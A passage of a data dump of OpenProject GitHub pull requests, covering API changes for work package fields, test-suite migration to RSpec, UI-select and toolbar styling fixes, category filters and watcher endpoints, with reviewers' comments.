397,opf/openproject,2598.0,"This PR relates to https://community.openproject.org/work_packages/18712 and should in the end allow to write percentage done and estimated time via API.

TBD:

* [x] Nice error messages
* [x] Tests","[""I've prepared a stage to preview changes. <a href='http://feature-patch---done-and-estimated-time.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://feature-patch---done-and-estimated-time.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>."", '@Azure7111: Because now I am thinking of it I want to make sure not to forget it:\r\n\r\nInclude a spec for the validation error when percentage done is disabled. This behaviour depends on returning `nil` and setting `render_nil` to false. Therefore we definitely want a test documenting this.', 'The error messages generated are quite odd:\r\n\r\n````\r\n{\r\n    ""_type"": ""Error"",\r\n    ""errorIdentifier"": ""urn:openproject-org:api:v3:errors:PropertyIsReadOnly"",\r\n    ""message"": ""You must not write a read-only attribute."",\r\n    ""_embedded"": {\r\n        ""details"": {\r\n            ""attribute"": ""estimated hours cannot be set on parent work packages.""\r\n        }\r\n    }\r\n}\r\n````\r\n\r\n`attribute` **must** contain the attribute (aka property) that was errorneous.\r\nI am not sure whether this is a fault in your code or in existing code. But it is quite weirdish.', 'Note: Using the changes of https://github.com/opf/openproject/pull/2672, you will be able to parse ISO durations in the `WorkPackagePayloadRepresenter`.', '@0xF013 the bug, that ""Percentage done"" is displayed in the details pane even though the admin settings are set to hiding the field should be finished once the dependency on the schema is established, right?', '@ulferts I will be following whatever schema gives me so I guess yes', '@Azure7111 the schema states that %done is not writable even though the setting should allow it. Please check.', '@ulferts a quick check lets me believe that it works on my machine. Can you tell me about your setup when you tried it?', '@Azure7111 I spotted one other problem:\r\n\r\nDetails pane:\r\n![image](https://cloud.githubusercontent.com/assets/617519/6619870/6e268e56-c8cd-11e4-98d0-44142e519139.png)\r\n\r\nRails view:\r\n![image](https://cloud.githubusercontent.com/assets/617519/6619894/900fdb9e-c8cd-11e4-9769-1a089b5932e2.png)\r\n', '@ulferts I would not like to give out rounded values via API, because those should probably be used by applications, which will more likely prefer exact values over nicely rounded ones.\r\n\r\nHowever, the problem you are addressing seems to be located more on the front-end side of things. Therefore I should probably call upon the help of @0xF013 ?', '@Azure7111 I could add rounding', '@0xF013 That should be a good solution :)', '@nickmessing Would you care to implement the rounding please?']"
398,opf/openproject,2682.0,"https://community.openproject.org/work_packages/4044

Continuation of #1461","[""I've prepared a stage to preview changes. <a href='http://myabc-feature-rspec-3.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://myabc-feature-rspec-3.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>."", 'Hound is slightly confused\xe2\x80\xa6', 'looks good to me except the one `pending` spec. what about it? does it fail?', ""@linki thanks for feedback. The `pending` spec does indeed fail. I'll need some help from @ulferts to figure out what the intended behaviour there should be."", ""I'd really like to press `merge` here *someday*.\r\n\r\nAny additions, complaints, threats?"", ""No, don't. It is too short before the proposed release and I unfortunately have not yet, other than what I said I'd do, configured a CI run with all our plugins."", '@ulferts I know that - I just wanted to keep the ball rolling.', '@myabc Any news here I should know about? I thought we wanted to press the button after the release?', ' My information was the same - I wondered a bit :confused: ']"
399,opf/openproject,2708.0,"## OpenProject work package

https://community.openproject.org/work_packages/19141

## Description

This PR provides core side extensions to be able to make the budget in `openproject-costs` patchable.

Notably:
- allow to mount new API endpoints into existing ones
- more configurability for schema helpers","[""I've prepared a stage to preview changes. <a href='http://nobodysnightmare-feature-budgets-api.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://nobodysnightmare-feature-budgets-api.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>."", 'Looks good generally, will wait for amends but am willing to merge eventually.']"
400,opf/openproject,2760.0,[``* `#17811` Style ui-select select2``](https://community.openproject.org/work_packages/17811),"[""I've prepared a stage to preview changes. <a href='http://vcostin-feature-17811-style-ui-select.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://vcostin-feature-17811-style-ui-select.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>."", '@myabc as @vcostin will be absent until the end of the week, could we hijack this?\r\n', '@floriank yep.']"
401,opf/openproject,2785.0,https://community.openproject.org/work_packages/18860,"[""I've prepared a stage to preview changes. <a href='http://nickmessing-bugfix-18860-show-hide-accessibility.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://nickmessing-bugfix-18860-show-hide-accessibility.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>.""]"
402,opf/openproject,2786.0,"Rebased, updated. Succeeds #2115.

## What this PR/WP does not do:

* update Test-Unit/xUnit-style assertions. A separate PR will handle this (indeed I've been working on a [tool to help convert these assertions automatically](https://github.com/myabc/unassertive)).
* remove the `rake test` tasks: we should hold off doing this until all CI jobs are updated.

## What this PR/WP does:

* rewrites Test-Unit tests using RSpec DSL.
* moves Test-Units into a `spec/legacy` folder.
* updates Rake tasks: 
  there are two separate `rake spec:core` and `rake spec:legacy` tasks, which are in turn, dependencies of `rake spec`.

The legacy specs are generally not good about cleaning up after themselves: for example, leaving state in the database. As such, the following will still produce errors:

```bash
rspec spec/**/*_spec.rb
rspec spec/legacy/**/*_spec.rb
``` 

while this will work:

```bash
rspec spec/legacy/unit/**/*_spec.rb
rspec spec/legacy/functional/**/*_spec.rb
rspec spec/legacy/integration/**/*_spec.rb
rspec spec/models/**/*_spec.rb
```
The Rake tasks take this into account. 

https://community.openproject.org/work_packages/19483","[""I've prepared a stage to preview changes. <a href='http://myabc-feature-remove-test-unit.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://myabc-feature-remove-test-unit.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>."", '@kgalli @jonasheinrich on merging this, we should should adjust the Tests value in Jenkins config:\r\n![config-core_config__jenkins_](https://cloud.githubusercontent.com/assets/755/7048190/bdc5b0e6-de11-11e4-8e5b-e0c14e878f5a.png)\r\n', ""@myabc I'm watching the ticket now. When this gets updated to merged, I will adjust the jobs on our ci. "", '@jonasheinrich thanks', 'lgtm :+1: ', 'I am keen enough to throw this into the dev branch. That means `release/4.1` will be safe from any unforeseen consequences...\r\n\r\nExcept those that I did not foresee....']"
403,opf/openproject,2687.0,"[``* `#17195 ` boolean``](http://community.openproject.org/work_packages/17195)
[``* `#17194 ` textarea``](http://community.openproject.org/work_packages/17194)
[``* `#17217 ` list``](http://community.openproject.org/work_packages/17217)
[``* `#17216 ` text, integer, float``](http://community.openproject.org/work_packages/17216)
[``* `#17218 ` version``](http://community.openproject.org/work_packages/17218)
[``* `#16643 ` user``](http://community.openproject.org/work_packages/16643)
[``* `#16944 ` budget``](http://community.openproject.org/work_packages/16944)

- [x] ?maybe switch version from another request to embedded check
- [x] spent units not counted as empty
- [x] revert height change on edit mode
- [x] make users links on author (also check for activity)
- [x] fix description format check
- [x] subject width changes in edit mode
- [x] non-textile description top covering Description header
- [x] remainingHours
- [x] estimatedTime
- [ ]  separate pr
  - [ ] date
  - [ ] date range
  - [ ] type
  - [ ] activity textarea onleave
- [x] enforce CF sorting
- [x] check for defining project when displaying version link
  - [x] extract version field in a separate directive (?)
-  [x] check unavailable version label
- [x] check obsolete translations
- [x] enable and fix backlogs and budget fields
  - [x] fix aggregated budget field
  - [x] create a PR in the costs plugin rep
- [x] deliver errors to all editables
- [x] deliver 'close' to all editables
- [x] fix version view for verion CF
- [x] boolean CF view
  - [x] check save with @NobodysNightmare 
  - [x] focus lost
- [x] input type number for integer and float CF
- [x] fix show all
- [x] refactor schema request in routing resolves and workpackage refresh
- [x] divide inplace editor dispatcher into several components
- [ ] integration tests
  - [ ] integration tests for time rounding to 2 digits after point
- [x] remove commented code
- [x] fix window refresh confirmation message from textarea
- [x] hide buttons during preview
- [x] description placeholder
- [x] fix clicking on a link on preview / display
- [x] remove unused components
- [x] fix CF list with @NobodysNightmare 
- [x] hours should be a link
- [x]  check all plugins
- [x] allow setting to null fields with no values
- [x] update activity
- [x] version link not clickable
- [x] show stuff for logged out
- [x] fix focusable element when tabbing
- [x] fix styling of dashboard covering next inplace editor","[""I've prepared a stage to preview changes. <a href='http://0xf013-feature-inplace-editable-custom-fields.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://0xf013-feature-inplace-editable-custom-fields.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>."", 'making a pull request now for visibility of the progress', '@myabc, @floriank can you please have a look on it ASAP as I think there might be other PRs coming along that will depend on it.', ""@ulferts it's nowhere close to being finished"", 'I am aware of that, just want to make sure that it gets premium PR handling.', '@ulferts _premium PR handling_? sounds like something we could charge extra for.', ""Just for the record:\r\n\r\nI tested the saving of boolean custom fields and it works for me.\r\n\r\n@0xF013 It is still possible, that you discovered a broken edge case, so please tell me how your broken custom field looks like (i.e. what are its settings? Is it required? Has it a default value?)\r\n\r\nI'll have another look into that then, but for now I assume that your frontend code is doing it right."", ""Not sure if this is expected to work, so tell me and I will make a separate ticket for that:\r\n\r\nIf you set your OP instance to no formatting (i.e. **not** textile), I'd expect the description to not have formatting controls, but they are present.\r\n\r\nAs a client you can recognize the current format setting by looking at the `format` property of the description (or any other `Formattable` you are interested in): If ti is `plain`, there is no formatting available, otherwise there is (and we currently only support `textile` as other option)."", '@NobodysNightmare that is a bug, thanks', 'On the styling side:\r\nI remember the inplace edit controls (\xe2\x9c\x93, \xe2\x9c\x93 \xe2\x9c\x89 and \xe2\x9d\x8c) to be placed absolutely, thereby *not increasing the height of their parent box*.\r\n\r\nCurrently opening the edit controls leads to the parent box growing in height and thereby destroying the layout.\r\n\r\nWithout controls:\r\n\r\n![Baseline exactly aligned](https://cloud.githubusercontent.com/assets/453584/7040875/070f6c12-ddd4-11e4-9c42-670071996524.PNG)\r\n\r\nWith controls:\r\n\r\n![Baseline not nearly aligned](https://cloud.githubusercontent.com/assets/453584/7040878/0e7c191e-ddd4-11e4-885c-b7c1a17264cc.PNG)\r\n', '@NobodysNightmare I added the increase in edit mode because for two inputs that are edited simultaneously one after another, the control buttons overlap with the next row and stuff is not clickable.', 'You mean like that:\r\n![layout-dev](https://cloud.githubusercontent.com/assets/453584/7040958/ef081c30-ddd4-11e4-986f-826116582a38.PNG)\r\n\r\nAfter a fix provided by @ulferts a while ago, the bottom element is still clickable where it is not visually obscured (e.g. I can still change the Version). So **I would** say the behaviour is known and intended, but that is only my impression.\r\n\r\nDid your changes introduce a new case where a property is completely unusable when the element above it has its controls expanded?', ""@NobodysNightmare I will revert it and let's see"", ""Okay, I'll retest the frontend once you've done that. Code-wise I did not have a look, but the functionality looks fine :)"", ""@0xF013 I see that there can be problematic cases like this one:\r\n\r\n![overlay](https://cloud.githubusercontent.com/assets/453584/7042341/86d0a382-dde1-11e4-89c2-c43bf3662ab4.PNG)\r\n\r\nStill I think it would be a change of known behaviour to change these styles here. I'd say let's discuss that separately from this PR, if you are fine with that..."", 'A styling issue that is new in your PR.\r\n\r\nRTA description:\r\n\r\n![description-title-visible](https://cloud.githubusercontent.com/assets/453584/7042674/d3ffbe48-dde3-11e4-81e0-bdbad37d3202.PNG)\r\n\r\nplain description:\r\n\r\n![description-title-hidden](https://cloud.githubusercontent.com/assets/453584/7042675/d4002d2e-dde3-11e4-9b9f-48726341d5e2.PNG)\r\n\r\nIn the latter case the title (**DESCRIPTION**) is hidden (probably by the textarea).\r\nI am not sure if this is caused by the description specific CSS hack that brings the rich-edit controls into a single line with the description...', '@NobodysNightmare description and subject fixes pushed', '### Reproduction\r\n\r\n1. enter comment into details pane\r\n2. submit comment\r\n3. refresh page (e.g. click into address bar and press enter)\r\n\r\n### Expected\r\n\r\npage simply refreshes\r\n\r\n### Actual\r\n\r\nwarning, that I have unsaved changes:\r\n\r\n![unsaved-changes](https://cloud.githubusercontent.com/assets/453584/7044223/5cd6ec34-ddf1-11e4-8c9e-ac8255a0aeda.png)\r\n', 'I found a backend-side issue regarding custom fields, that is quite dubious.\r\n\r\nIf you encounter any of the following it is an API issue not related to the changes by Mihail:\r\n- a bool CF set to false is deleted when you change an unrelated property\r\n- a bool CF is deleted when you try to set it to false\r\n- when you add a comment, a deleted bool CF is added as false\r\n\r\nWeird Weird...', 'I sense some falsey circus', '@NobodysNightmare regarding onunload handler, it worked as that before my PR. I would fix that in a separate workpackage', 'Upon opening the details pane it seems like the focus slides along all editable fields briefly before finally coming to a halt at the subject.\r\n\r\nThis behaviour is new and hard to describe... Do you need a screencast or can you reproduce it yourself?\r\n\r\n![embedded GIF](https://gfycat.com/DeadlyRevolvingArieltoucan)\r\n[link to GIF if embedding is broken](https://gfycat.com/DeadlyRevolvingArieltoucan)', 'Not important, but if it is easy peasy:\r\n\r\nUsing the arrows of the input for the estimated time I can spin to negative values. It would be great if it stopped at 0.\r\n\r\n**Note**: Really just a *nice-to-have*. Do not put any effort into this if it is more than e.g. adding `minvalue=""0""`', '> Not important, but if it is easy peasy:\r\n\r\n@NobodysNightmare It\'s so easy-peasy, you could probably do it :)\r\n`frontend/app/templates/work_packages/inplace_editor/custom/editable/duration.html`\r\n\r\nThe attribute is `min=""0""` not `minvalue=""0""`. See http://www.w3.org/TR/html-markup/input.number.html']"
404,opf/openproject,2796.0,":traffic_light: This PR allows us to finally get rid of ui-select2

* Add basic spec coverage.

https://community.openproject.org/work_packages/18951","[""I've prepared a stage to preview changes. <a href='http://myabc-feature-18951-ui-select-timelines.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://myabc-feature-18951-ui-select-timelines.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>."", 'I am missing the dropdown button on the right hand side:\r\n\r\n![combobox](https://cloud.githubusercontent.com/assets/453584/7086945/a5f8f5e2-df86-11e4-8613-3760e349151e.PNG)\r\n\r\nCurrently it does not look like a combobox-ish control, but like a textbox.', 'The combobox is trolling me: [click for awesome GIF](https://gfycat.com/LittleEminentCarpenterant)\r\n\r\nWhen trying to filter the combobox it highlights the entry I am looking for, but it does not actually select it, neither does it remove entries that are not matching my selection...\r\n\r\nPressing enter loads (as expected) the entry I did not want, but whcih was selected.', '@NobodysNightmare is this happening in other comboboxes? (e.g. work package details view)', '@myabc Now that you say it: Yes it is the same for the details view controls.\r\n\r\nI did never realize it there, because upon opening them for the first time they have that little edit icon on the right side, so I simply click them and if a dropdown happens to pop up I am happy.\r\n\r\nAfter selecting an entry from the dropdown the edit icon is not there and IMHO the dropdown button is missing (i.e. the button does not need to be visible as long as I have the edit icon)\r\n\r\n![inplace](https://cloud.githubusercontent.com/assets/453584/7087301/337fa098-df8a-11e4-899c-f15a8464bd69.PNG)\r\n', ""That is all my own opinion though, don't know what the style guide says about that..."", 'Regarding the [filtering issue](https://gfycat.com/LittleEminentCarpenterant):\r\n\r\nThis is only happening for the timeline select combobox, details pane works fine...', ""not sure if this was the same issue @vcostin was working on? (it's been a while since I rebased)"", '> Regarding the filtering issue:\r\n\r\n> This is only happening for the timeline select combobox, details pane works fine...\r\n\r\n@NobodysNightmare Thanks for awesome GIFs.  6eb6612 should resolve this issue.', ""@NobodysNightmare mind manually merging this into `release/4.1`? \xe2\x80\x93 it'd save me a few minutes and keep the excellent comments in tact :wink: "", 'of course... let me just verify your fix :wink: ', ""It now works as intended, but I am not sure if I am seeing the right thing.\r\n\r\nCan you verify that this is what I should see:\r\n\r\n![right-thing](https://cloud.githubusercontent.com/assets/453584/7176196/7e1d7864-e41c-11e4-8539-d25d8cf1b787.PNG)\r\n\r\nI am in doubt because:\r\n- I already needed to delete `tmp` and `.sass-cache` because otherwise buttons looked wrong\r\n- I expected the select element to look like the one I posted previously, but it doesn't..."", ""Ignore the aesthetics of the buttons and UI-select element. The branch\nhasn't been rebased in some time and doesn't include the Foundation upgrade\nor UI-select styling commits.\n\nOn Thursday, April 16, 2015, Jan Sandbrink <notifications@github.com> wrote:\n\n> It now works as intended, but I am not sure if I am seeing the right thing.\n>\n> Can you verify that this is what I should see:\n>\n> [image: right-thing]\n> <https://cloud.githubusercontent.com/assets/453584/7176196/7e1d7864-e41c-11e4-8539-d25d8cf1b787.PNG>\n>\n> I am in doubt because:\n>\n>    - I already needed to delete tmp and .sass-cache because otherwise\n>    buttons looked wrong\n>    - I expected the select element to look like the one I posted\n>    previously, but it doesn't...\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/opf/openproject/pull/2796#issuecomment-93667620>.\n>\n"", 'Merged it into `dev` and merged it into `release/4.1` afterwards -.-\r\n\r\nOne extra commit ^^']"
405,opf/openproject,2872.0,"Element IDs were out of sync. Added feature spec.

WP [#19549](https://community.openproject.org/work_packages/19549)","[""I've prepared a stage to preview changes. <a href='http://machisuji-fix-forum-quote-message.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://machisuji-fix-forum-quote-message.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>."", '@machisuji Specs are failing, looks like legitimate failures...', ""Yeah ...\r\n\r\n```\r\n 3) Error:\r\nActivitiesControllerTest#test_previous_project_index:\r\nActionView::Template::Error: couldn't find file 'bundles/openproject-global'\r\n```"", ""There are legitimate ones too, though. Yes. I'm looking into it."", ""Added the WIP label, you are still working on that one, aren't you?"", ""True. The specs are finally green, yay. So I can do a bit of refactoring now, throwing out Prototype, and then I'm done."", '@machisuji can you squash/rebase out cd256f9?', 'Please note that the failing specs are unrelated to this PR. The spec for this PR itself and the other board related specs are green.', ""I don't believe you... Are you telling me, that the specs are already failing on the ~~`dev`~~ `release/4.1` branch?\r\n\r\nOtherwise there is no way, that you did not break it ^^"", ""That was referring to the state before d263823. Now d263823 does fail, but that's because of the refactoring and a test (not spec) that tests against the old implementation. I'll adjust the test. Then everything should be green."", 'LGTM (if travis agrees) :+1: ', 'LGTM too!', 'LGTM, merge it when travis says ok.', ""Great, you've accumulated 3x LGTM!\r\n\r\n:+1: :+1: :+1: "", 'now go and get me 20 rugged hides!', '@Azure7111 what do you think?', ""I'm expecting a purple reward."", 'Your reading skill has increased by one point.', ""Purple? Here's a grey and 50 copper."", 'This leaves me [disappointed](https://www.youtube.com/watch?v=_O1hM-k3aUY&t=10).']"
406,opf/openproject,2891.0,https://community.openproject.org/work_packages/19669,"[""I've prepared a stage to preview changes. <a href='http://myabc-feature-19669-toolbar-filter-count.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://myabc-feature-19669-toolbar-filter-count.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>."", 'dat work package...', ""good enough for a review.\r\n\r\nI wrote Capybara tests rather than Protractor tests for three reasons:\r\n\r\n1. #2892 \xe2\x80\x93 I was perplexed.\r\n2. I think it's useful to test the full stack here.\r\n3. Query object/filters structure will change once v3 API WP index endpoint is implemented. I didn't want to invest too much time in adding fixture data."", ""@myabc I hate that there isn't a solution for js tests without mocks"", '@0xF013 - i still would like a swagger like solution by generating the mocks from the api docs', ""@floriank mocks aren't always helpful because we also need to test the patch and put responses for different cases like success, failure, etc"", '@0xF013 yeah. but it would be a start not having to build the mocks by hand.\r\n\r\n@myabc disregarding the code for itself for a moment - how do I know the acceptance criteria for this?', '> @0xF013 yeah. but it would be a start not having to build the mocks by hand.\r\n\r\n:+1: \xe2\x80\x93 something for a future milestone!', 'I supsect this certainly does what was wished for with the user story. Code Review later', '@myabc Like I said earlier, I don\'t think that this looks very well. It is basically as if someone put a sticker onto that button. I\'d expect it to be part of the button and (e.g.) change its appearance with the different button states (normal, pressed, etc).\r\n\r\nHowever, there are ***no*** acceptance criteria, so it would also be okay if you put a *deer sticker* on that button... Not to mention things like ""the wrong time for more features""...', 'Acceptance criteria: look at the screenshots in the related epic.\n\nI like the idea of a deer sticker, but I don\'t think this is the place for\nsuch an important design discussion.\n\nOn Wednesday, April 22, 2015, Jan Sandbrink <notifications@github.com>\nwrote:\n\n> @myabc <https://github.com/myabc> Like I said earlier, I don\'t think that\n> this looks very well. It is basically as if someone put a sticker onto that\n> button. I\'d expect it to be part of the button and (e.g.) change its\n> appearance with the different button states (normal, pressed, etc).\n>\n> However, there are *no* acceptance criteria, so it would also be okay if\n> you put a *deer sticker* on that button... Not to mention things like\n> ""the wrong time for more features""...\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/opf/openproject/pull/2891#issuecomment-95051399>.\n>\n', ""Which is the related EPIC? I'd expect a single click, maybe two... After some searching I found this: http://clients.zzmedia.net/openproject/workpackages/filter/\r\n\r\nDoes not look like what's implemented, though. But maybe that is okay... I don't know..."", 'I am inclined to merge this PR, as it looks as if it would do what it is supposed to do. It also looks okay code-wise, at least as far as I can tell for JS.\r\n\r\nAny objections?', 'I am not even sure if the visual is still up to date. Code wise this was okay. :+1: for the testing part via capybara.', '> I am not even sure if the visual is still up to date. \r\n\r\nk.A.']"
407,opf/openproject,2908.0,"## OpenProject work package

https://community.openproject.org/work_packages/19759
public WP: https://community.openproject.org/work_packages/19809

## Description

This PR adds category filters to the WP list. Those filters were available before and simply forgotten to implement.

For better forwards compatibility I did not invent an experimental API endpoint for categories, but used the one introduced in release 4.1. That involved some backporting, see the notes below.

## :warning: :warning: :warning:  Important notes :warning: :warning: :warning: 

Commit https://github.com/opf/openproject/commit/23e7b113c4af39f76d1cd733aeb808521c0a1806 contains lots of code that was backported from `release/4.1`.

You should merge that **commit** (read: not the PR, but the sole commit) into the `release/4.1` branch using the `ours` strategy:

````
git checkout release/4.1
git merge -s ours 23e7b113c4af39f76d1cd733aeb808521c0a1806 -m ""Resolving forward-merge of backport commit""
````

The afforementioned commit contains things like ridicuously simplified specs (to have basic specs, but to not let them fail or backport them in a 4.0 compatible manner; e.g. error cases).
It should be considered poisonous for everything else, but the `release/4.0` branch.

The rest of this PR can be merged safely and should not contain unhealthy ingredients.","[""I've prepared a stage to preview changes. <a href='http://nobodysnightmare-feature-fix-category-filter.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://nobodysnightmare-feature-fix-category-filter.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>."", ""This should work now - I have decided to to the porting to `release/4.1` in a separate PR which I'll reference here."", 'The port for this to `release/4.1` is open for discussion at #2911', 'Note: Public WP - https://community.openproject.org/work_packages/19809', '@NobodysNightmare there is still some sh.. I mean stuff breaking in the postgresql test suite :(', ""I did what always works: I restarted the offending test job. The issues don't make any sense to me, so before trying to understand them, I try to forget them..."", 'Ha! It worked!']"
408,opf/openproject,2992.0,[``* `#19679` [Design] Input fields cut off at bottom (e.g. in timeline configuration)``](https://community.openproject.org/work_packages/19679) ,"[""I've prepared a stage to preview changes. <a href='http://vcostin-bug-19679-input-fields-cut-at-bottom.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://vcostin-bug-19679-input-fields-cut-at-bottom.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>."", 'can you squash the last commit @vcostin?', '@floriank done, and lvl up, thanks :+1: ', 'Functionality is given :+1: \r\n']"
409,opf/openproject,3000.0,"This will harmonize all the headings in the core application to use the same DOM structure (and thereby be properly aligned), __except__ for Wiki, which is .. complicated, to say the least.

This should meet most of the requirements in https://community.openproject.org/work_packages/18330, as well as https://community.openproject.org/work_packages/19911.

Should also address minor styling issues in general and should supersede #2910 .

Wiki headings are addressed in #3002 ","[""I've prepared a stage to preview changes. <a href='http://floriank-feature-18330-use-toolbar.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://floriank-feature-18330-use-toolbar.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>."", 'I had a sighting on the board of the seeded project. Can you spot the error?\r\n\r\n![screenshot](https://cloud.githubusercontent.com/assets/453584/7700812/b5939ab6-fe21-11e4-9e00-64970b678ed6.png)\r\n\r\nHint: Look at the toolbar buttons', 'Well, it seems the logo is off by one pixel :wink: ', 'well, it seems this is a general issue with the toolbar component', '> well, it seems this is a general issue with the toolbar component\r\n\r\nI assumed that. Will probably always happen for extensive subtitles...', '## [Current coverage][1] is `79.12%`\n> Merging **#3000** into **release/4.1** will change coverage by **+79.12%** by [`21ee988`][3]\n\n\n#### Coverage Diff\n> No diff could be generated. No reports for `release/4.1` found.\n\n\n-----\n### [Uncovered Suggestions][2]\n\n1. `+0.22%` via [...s/rfpdf/lib/tcpdf.rb#305...358](https://codecov.io/github/opf/openproject/lib/plugins/rfpdf/lib/tcpdf.rb?ref=21ee9886c661058805060de686d9f966eecd56da#305) \n1. `+0.21%` via [...s/rfpdf/lib/tcpdf.rb#223...274](https://codecov.io/github/opf/openproject/lib/plugins/rfpdf/lib/tcpdf.rb?ref=21ee9886c661058805060de686d9f966eecd56da#223) \n1. `+0.16%` via [...df/lib/rfpdf/fpdf.rb#66...104](https://codecov.io/github/opf/openproject/lib/plugins/rfpdf/lib/rfpdf/fpdf.rb?ref=21ee9886c661058805060de686d9f966eecd56da#66) \n1. *[See 7 more...][2]*\n\n[1]: https://codecov.io/github/opf/openproject?ref=21ee9886c661058805060de686d9f966eecd56da\n[2]: https://codecov.io/github/opf/openproject/features/suggestions?ref=21ee9886c661058805060de686d9f966eecd56da\n[3]: https://github.com/opf/openproject/commit/21ee9886c661058805060de686d9f966eecd56da\n\n> Powered by [Codecov](https://codecov.io)', 'God I hate CSS.', 'This is what happens when you write ""full stack"" into your CV ;-)', ' Never did that, I mentioned explicitly that i am not a CSS guy. Strangely enough, it is the only thing i have been doing since i joined', 'I am getting ugly title texts when there are ""manual braedcrumbs"":\r\n\r\n![title-text](https://cloud.githubusercontent.com/assets/453584/7701095/0417c3ae-fe24-11e4-8034-f19117a9461d.png)\r\n\r\nAlso affecting (at least) enumerations.', 'It affects all the custom ""breadcrumbs"" (which we should remove as soon as possible)', '@NobodysNightmare @floriank \r\n\r\n> I am getting ugly title texts when there are ""manual braedcrumbs"":\r\n\r\nThis begs the question (although a designer opinion might be helpful here) \xe2\x80\x93 why not just show this information within the actual breadcrumb?\r\n\r\n![team_2_-_openproject_-__scrum_-_repository_-_openproject](https://cloud.githubusercontent.com/assets/755/7701263/c3c22ca2-fe25-11e4-8814-7999c3fa8444.png)\r\n', 'good point @myabc \r\n\r\nBut this is out of scope for this PR - We need to finish this first before opening the next working site.', ""Generally looks good. Two more comments:\r\n\r\n  1. `ToolbarHelper` should probably have a spec.\r\n  2.  For #2910 I had planned a slightly different approach:\r\n    1. **for every page to have the toolbar with title component**: this would involve modifying `app/views/layouts/angular.html.erb` and `app/views/layouts/base.html.erb`. The toolbar container could be moved outside of `div#content`, inserted just after `div#breadcrumb`.\r\n    2. separate helpers for setting page title + for adding toolbar items that would use  `content_for`.\r\n    3. removal of `<%= render :partial => 'layouts/action_menu' %>` from `app/views/layouts/base.html.erb`.\r\n\r\nThese comments don't need to be addressed now, but should be borne in mind for #2910 / further refactoring."", 'I added basic specs for the `ToolbarHelper`. I will address Point 2 in part during the bugfixing in `4.1.1`', 'Note I added https://community.openproject.org/work_packages/19911 to the list of adressed work packages, as you made a reference on the WP, that this PR should fix it.', 'Better, but not quite done yet ;)\r\n\r\n![board2](https://cloud.githubusercontent.com/assets/453584/7720336/67bfafe0-fecc-11e4-9541-a7aeaa1ff7dc.PNG)\r\n\r\nWhat irritates me is that the box of the `toolbar-container` does not include the height of the `subtitle`. Also irritating to find another `<br>` right below the toolbar in question ;-)\r\n\r\nedit: I have the feeling that we are using too many floats in our layouts... But then I realize, that I have no profound CSS knowledge...', '@NobodysNightmare I updated this to get rid of the layouting issue and removed the `<br>`']"
410,opf/openproject,2345.0,"## OpenProject Work Packages

* https://community.openproject.org/work_packages/17755
* includes non WP specifications that harmonize the API

## Content

* new endpoint for current watchers of a work package
* clarification on when to return 404 and 403 for some endpoints
    * this change *should* not affect the actual implementation, however I did not verify that
* allow adding single watchers
* ~~endpoint for available watchers is now also placed under a project scope~~

## Changes to existing endpoints

* [x] new error identifier that shall also be used for `PATCH work package` (and its form)
* [x] there is an endpoint to list watchers of a work package
* [x] watchers are linked in Work Package
* [x] the `watch` link of the work package has an updated `data` section (that is now called `payload`)
* [x] watchers are embedded as collection resource
* [x] add watchers now accepts a new request format
    * [x] adapt angular client
* [x] ~~add watchers now returns the list of current watchers~~

## Additional changes required to implementation

The implementation thankfully differed from the existing documentaion already. Here are the things I could find:

* [x] `watchChanges` has to be called `watch` (same for `unwatchChanges` which is now `unwatch`)
* [x] fix HTTP 500 adding a non-existant user as watcher
* [x] check response when removing a non-watching user/non existant user as watcher

## Additional changes required for documentation

* [x] move available watchers endpoint back to WP scope

